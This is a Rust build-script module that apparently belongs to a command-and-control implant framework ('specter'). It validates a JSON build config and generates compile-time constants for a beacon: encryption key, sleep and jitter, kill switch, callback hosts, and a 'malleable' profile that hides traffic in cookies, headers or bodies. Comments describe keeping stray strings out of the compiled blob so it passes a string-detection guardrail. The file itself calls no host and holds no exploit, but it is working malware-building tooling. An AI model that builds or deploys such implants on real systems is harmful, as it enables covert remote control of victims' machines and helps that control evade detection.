//! Per-build config rendering: plugin JSON -> generated Rust source.
//!
//! Shared by the build script (host-side, via specter-core's build.rs) and by
//! the host unit tests (included from crates/core/src/config.rs under
//! `#[cfg(test)]`). Nothing here ends up in the blob: only the *generated
//! constants* do, compiled through the no_std config types.
//!
//! Contract with agent_specter (decision 2026-10-22: JSON reused verbatim on
//! the Go side): the plugin writes a JSON file with the build parameters and
//! the malleable C2 profile (format v2, same schema as profiles/*.json):
//!
//! ```json
//! {
//!   "aes_key": "<64 hex chars>",
//!   "sleep_ms": 30000,
//!   "jitter_ms": 2000,
//!   "watermark": 305419896,
//!   "kill_epoch": 0,
//!   "profile": { ...malleable profile v2... }
//! }
//! ```
//!
//! The JSON is parsed and validated here, at build time: the beacon embeds
//! typed constants and carries no JSON parser, no runtime decoding, no
//! strings beyond the intended profile data (which goes to the strings
//! manifest for the anti-strings guardrail).

// Compiled in two host contexts: as part of build.rs (std implicit) and
// inside the no_std crate under #[cfg(test)] (std prelude must be explicit).
use std::prelude::v1::*;

// ---------------------------------------------------------------------------
// Model (owned, host-side) — mirrors the no_std types in src/config.rs.
// ---------------------------------------------------------------------------

#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum Rotation {
    Sequential,
    Random,
}

#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum Encoding {
    Base64,
    Base64Url,
}

#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum Placement {
    Cookie,
    Header,
    Body,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct MetadataTransport {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
    pub name: String,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct OutputTransport {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct OutputWrap {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
    pub prepend: String,
    pub append: String,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct GetDirection {
    pub uris: Vec<String>,
    pub metadata: MetadataTransport,
    pub headers: Vec<String>,
    pub server_output: OutputWrap,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct PostDirection {
    pub uris: Vec<String>,
    pub metadata: MetadataTransport,
    pub client_output: OutputTransport,
    pub headers: Vec<String>,
    pub server_output: OutputWrap,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct ProfileModel {
    pub rotation: Rotation,
    pub beacon_id_header: String,
    pub hosts: Vec<String>,
    pub user_agent: String,
    pub get: GetDirection,
    pub post: PostDirection,
}

#[derive(Debug, PartialEq, Eq, Clone)]
pub struct ConfigModel {
    pub aes_key: [u8; 32],
    pub sleep_ms: u32,
    pub jitter_ms: u32,
    pub watermark: u32,
    pub kill_epoch: u64,
    pub profile: ProfileModel,
}

pub struct Generated {
    pub rust_source: String,
    /// Strings the blob may legitimately contain; anything else found in the
    /// blob fails the anti-strings guardrail (tools/check_blob.py).
    pub strings_manifest: Vec<String>,
}

// ---------------------------------------------------------------------------
// Parsing and validation — strict: a malformed config must fail the build,
// never generate a half-valid beacon.
// ---------------------------------------------------------------------------

fn field<'a>(v: &'a serde_json::Value, name: &str) -> Result<&'a serde_json::Value, String> {
    v.get(name).ok_or_else(|| format!("missing field `{name}`"))
}

fn u64_of(v: &serde_json::Value, name: &str) -> Result<u64, String> {
    field(v, name)?
        .as_u64()
        .ok_or_else(|| format!("field `{name}` must be a non-negative integer"))
}

fn string_of(v: &serde_json::Value, name: &str) -> Result<String, String> {
    field(v, name)?
        .as_str()
        .ok_or_else(|| format!("field `{name}` must be a string"))
        .map(str::to_owned)
}

fn string_list(v: &serde_json::Value) -> Result<Vec<String>, String> {
    let arr = v
        .as_array()
        .ok_or_else(|| "expected an array of strings".to_string())?;
    arr.iter()
        .map(|e| {
            e.as_str()
                .ok_or_else(|| "expected an array of strings".to_string())
                .map(str::to_owned)
        })
        .collect()
}

fn strings_of(v: &serde_json::Value, name: &str) -> Result<Vec<String>, String> {
    string_list(field(v, name)?)
}

fn rotation_of(v: &serde_json::Value, name: &str) -> Result<Rotation, String> {
    match string_of(v, name)?.as_str() {
        "sequential" => Ok(Rotation::Sequential),
        "random" => Ok(Rotation::Random),
        other => Err(format!("field `{name}`: unknown rotation `{other}`")),
    }
}

fn encoding_of(v: &serde_json::Value, name: &str) -> Result<Encoding, String> {
    match string_of(v, name)?.as_str() {
        "base64" => Ok(Encoding::Base64),
        "base64url" => Ok(Encoding::Base64Url),
        other => Err(format!("field `{name}`: unknown encoding `{other}`")),
    }
}

fn placement_of(v: &serde_json::Value, name: &str) -> Result<Placement, String> {
    match string_of(v, name)?.as_str() {
        "cookie" => Ok(Placement::Cookie),
        "header" => Ok(Placement::Header),
        "body" => Ok(Placement::Body),
        other => Err(format!("field `{name}`: unknown placement `{other}`")),
    }
}

fn bool_of(v: &serde_json::Value, name: &str) -> Result<bool, String> {
    field(v, name)?
        .as_bool()
        .ok_or_else(|| format!("field `{name}` must be a boolean"))
}

fn metadata_of(v: &serde_json::Value) -> Result<MetadataTransport, String> {
    let m = field(v, "metadata")?;
    let placement = placement_of(m, "placement")?;
    // The cookie placement needs a cookie name; the header placement carries
    // the name in the beacon_id_header field instead.
    let name = m
        .get("name")
        .map(|n| {
            n.as_str()
                .ok_or_else(|| "metadata.name must be a string".to_string())
                .map(str::to_owned)
        })
        .transpose()?
        .unwrap_or_default();
    if placement == Placement::Cookie && name.is_empty() {
        return Err("cookie placement requires a cookie `name`".to_string());
    }
    Ok(MetadataTransport {
        format: encoding_of(m, "format")?,
        mask: m.get("mask").and_then(|b| b.as_bool()).unwrap_or(true),
        placement,
        name,
    })
}

fn output_transport_of(v: &serde_json::Value) -> Result<OutputTransport, String> {
    Ok(OutputTransport {
        format: encoding_of(v, "format")?,
        mask: bool_of(v, "mask")?,
        placement: placement_of(v, "placement")?,
    })
}

fn output_wrap_of(v: &serde_json::Value) -> Result<OutputWrap, String> {
    Ok(OutputWrap {
        format: encoding_of(v, "format")?,
        mask: bool_of(v, "mask")?,
        placement: placement_of(v, "placement")?,
        prepend: v
            .get("prepend")
            .and_then(|p| p.as_str())
            .unwrap_or("")
            .to_string(),
        append: v
            .get("append")
            .and_then(|p| p.as_str())
            .unwrap_or("")
            .to_string(),
    })
}

fn get_of(v: &serde_json::Value) -> Result<GetDirection, String> {
    let g = field(v, "get")?;
    let client = field(g, "client")?;
    let server = field(g, "server")?;
    Ok(GetDirection {
        uris: strings_of(g, "uris")?,
        metadata: metadata_of(client)?,
        headers: match client.get("headers") {
            Some(h) => string_list(h)?,
            None => Vec::new(),
        },
        server_output: output_wrap_of(field(server, "output")?)?,
    })
}

fn post_of(v: &serde_json::Value) -> Result<PostDirection, String> {
    let p = field(v, "post")?;
    let client = field(p, "client")?;
    let server = field(p, "server")?;
    Ok(PostDirection {
        uris: strings_of(p, "uris")?,
        metadata: metadata_of(client)?,
        client_output: output_transport_of(field(client, "output")?)?,
        headers: match client.get("headers") {
            Some(h) => string_list(h)?,
            None => Vec::new(),
        },
        server_output: output_wrap_of(field(server, "output")?)?,
    })
}

fn profile_of(v: &serde_json::Value) -> Result<ProfileModel, String> {
    let version = u64_of(v, "version")?;
    if version != 2 {
        return Err(format!("unsupported profile version {version} (want 2)"));
    }
    let hosts = strings_of(v, "hosts")?;
    if hosts.is_empty() {
        return Err("profile.hosts must not be empty".to_string());
    }
    Ok(ProfileModel {
        rotation: rotation_of(v, "rotation")?,
        beacon_id_header: string_of(v, "beacon_id_header")?,
        hosts,
        user_agent: string_of(v, "user_agent")?,
        get: get_of(v)?,
        post: post_of(v)?,
    })
}

fn parse_aes_key(hex: &str) -> Result<[u8; 32], String> {
    let bytes = hex::decode(hex).map_err(|e| format!("aes_key: {e}"))?;
    let key: [u8; 32] = bytes
        .try_into()
        .map_err(|_| "aes_key must be exactly 32 bytes (64 hex chars)".to_string())?;
    Ok(key)
}

pub fn parse_config(json: &str) -> Result<ConfigModel, String> {
    let v: serde_json::Value =
        serde_json::from_str(json).map_err(|e| format!("invalid JSON: {e}"))?;
    Ok(ConfigModel {
        aes_key: parse_aes_key(&string_of(&v, "aes_key")?)?,
        sleep_ms: u64_of(&v, "sleep_ms")? as u32,
        jitter_ms: u64_of(&v, "jitter_ms")? as u32,
        watermark: u64_of(&v, "watermark")? as u32,
        kill_epoch: u64_of(&v, "kill_epoch")?,
        profile: profile_of(field(&v, "profile")?)?,
    })
}

/// Minimal hex decoder (avoids pulling a hex crate; build-time only).
mod hex {
    use std::prelude::v1::*;
    pub fn decode(s: &str) -> Result<Vec<u8>, String> {
        let s = s.as_bytes();
        if s.len() % 2 != 0 {
            return Err("odd-length hex string".to_string());
        }
        fn nybble(b: u8) -> Result<u8, String> {
            match b {
                b'0'..=b'9' => Ok(b - b'0'),
                b'a'..=b'f' => Ok(b - b'a' + 10),
                b'A'..=b'F' => Ok(b - b'A' + 10),
                _ => Err(format!("invalid hex byte 0x{b:02x}")),
            }
        }
        (0..s.len() / 2)
            .map(|i| Ok((nybble(s[2 * i])? << 4) | nybble(s[2 * i + 1])?))
            .collect()
    }
}

// ---------------------------------------------------------------------------
// Rendering: model -> Rust source, referencing the no_std types of
// src/config.rs. Everything is const: the beacon reads config at compile
// time, never parses anything.
// ---------------------------------------------------------------------------

fn escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{{{:x}}}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

fn quoted(s: &str) -> String {
    format!("\"{}\"", escape(s))
}

fn str_array(items: &[String]) -> String {
    let inner: Vec<String> = items.iter().map(|s| quoted(s)).collect();
    format!("[{}]", inner.join(", "))
}

fn rot(r: Rotation) -> &'static str {
    match r {
        Rotation::Sequential => "Rotation::Sequential",
        Rotation::Random => "Rotation::Random",
    }
}

fn enc(e: Encoding) -> &'static str {
    match e {
        Encoding::Base64 => "Encoding::Base64",
        Encoding::Base64Url => "Encoding::Base64Url",
    }
}

fn place(p: Placement) -> &'static str {
    match p {
        Placement::Cookie => "Placement::Cookie",
        Placement::Header => "Placement::Header",
        Placement::Body => "Placement::Body",
    }
}

fn metadata_const(m: &MetadataTransport) -> String {
    format!(
        "MetadataTransport {{ format: {}, mask: {}, placement: {}, name: {} }}",
        enc(m.format),
        m.mask,
        place(m.placement),
        quoted(&m.name)
    )
}

fn output_transport_const(o: &OutputTransport) -> String {
    format!(
        "OutputTransport {{ format: {}, mask: {}, placement: {} }}",
        enc(o.format),
        o.mask,
        place(o.placement)
    )
}

fn output_wrap_const(o: &OutputWrap) -> String {
    format!(
        "OutputWrap {{ format: {}, mask: {}, placement: {}, prepend: {}, append: {} }}",
        enc(o.format),
        o.mask,
        place(o.placement),
        quoted(&o.prepend),
        quoted(&o.append)
    )
}

fn manifest_of(model: &ConfigModel) -> Vec<String> {
    let p = &model.profile;
    let mut m = vec![p.beacon_id_header.clone(), p.user_agent.clone()];
    m.extend(p.hosts.iter().cloned());
    m.extend(p.get.uris.iter().cloned());
    m.extend(p.get.headers.iter().cloned());
    m.push(p.get.metadata.name.clone());
    m.push(p.get.server_output.prepend.clone());
    m.push(p.get.server_output.append.clone());
    m.extend(p.post.uris.iter().cloned());
    m.extend(p.post.headers.iter().cloned());
    m.push(p.post.metadata.name.clone());
    m.push(p.post.server_output.prepend.clone());
    m.push(p.post.server_output.append.clone());
    m.retain(|s| !s.is_empty());
    m.sort();
    m.dedup();
    m
}

/// Render the generated Rust module (included by src/config.rs).
pub fn render(model: &ConfigModel) -> String {
    let p = &model.profile;
    let key = model
        .aes_key
        .iter()
        .map(|b| format!("0x{b:02x}"))
        .collect::<Vec<_>>()
        .join(", ");
    format!(
        "// GENERATED by specter-core build.rs from the per-build config — DO NOT EDIT.\n\
         // Source: agent_specter plugin config (or the dev default when SPT_CONFIG is unset).\n\n\
         pub const AES_KEY: [u8; 32] = [{key}];\n\
         pub const SLEEP_MS: u32 = {};\n\
         pub const JITTER_MS: u32 = {};\n\
         pub const WATERMARK: u32 = {};\n\
         pub const KILL_EPOCH: u64 = {};\n\n\
         pub const ROTATION: Rotation = {};\n\
         pub const BEACON_ID_HEADER: &str = {};\n\
         pub const HOSTS: [&str; {}] = {};\n\
         pub const USER_AGENT: &str = {};\n\n\
         pub const GET_URIS: [&str; {}] = {};\n\
         pub const GET_METADATA: MetadataTransport = {};\n\
         pub const GET_HEADERS: [&str; {}] = {};\n\
         pub const GET_SERVER_OUTPUT: OutputWrap = {};\n\n\
         pub const POST_URIS: [&str; {}] = {};\n\
         pub const POST_METADATA: MetadataTransport = {};\n\
         pub const POST_CLIENT_OUTPUT: OutputTransport = {};\n\
         pub const POST_HEADERS: [&str; {}] = {};\n\
         pub const POST_SERVER_OUTPUT: OutputWrap = {};\n",
        model.sleep_ms,
        model.jitter_ms,
        model.watermark,
        model.kill_epoch,
        rot(p.rotation),
        quoted(&p.beacon_id_header),
        p.hosts.len(),
        str_array(&p.hosts),
        quoted(&p.user_agent),
        p.get.uris.len(),
        str_array(&p.get.uris),
        metadata_const(&p.get.metadata),
        p.get.headers.len(),
        str_array(&p.get.headers),
        output_wrap_const(&p.get.server_output),
        p.post.uris.len(),
        str_array(&p.post.uris),
        metadata_const(&p.post.metadata),
        output_transport_const(&p.post.client_output),
        p.post.headers.len(),
        str_array(&p.post.headers),
        output_wrap_const(&p.post.server_output),
    )
}

pub fn generate(json: &str) -> Result<Generated, String> {
    let model = parse_config(json)?;
    Ok(Generated {
        rust_source: render(&model),
        strings_manifest: manifest_of(&model),
    })
}

/// Default config used when SPT_CONFIG is unset (dev and CI builds):
/// profiles/default.json wrapped in build parameters, mirroring the
/// `#ifndef` fallbacks of the original Config.h (localhost C2, zero key,
/// disabled killswitch). Production builds always set SPT_CONFIG.
pub fn default_config_json() -> String {
    let profile = std::fs::read_to_string("../../profiles/default.json")
        .expect("profiles/default.json must exist next to the workspace");
    let model = serde_json::from_str::<serde_json::Value>(&profile)
        .expect("profiles/default.json must be valid JSON");
    let wrapper = serde_json::json!({
        "aes_key": "00".repeat(32),
        "sleep_ms": 30000,
        "jitter_ms": 2000,
        "watermark": 0,
        "kill_epoch": 0,
        "profile": model,
    });
    serde_json::to_string(&wrapper).expect("serializing default config")
}
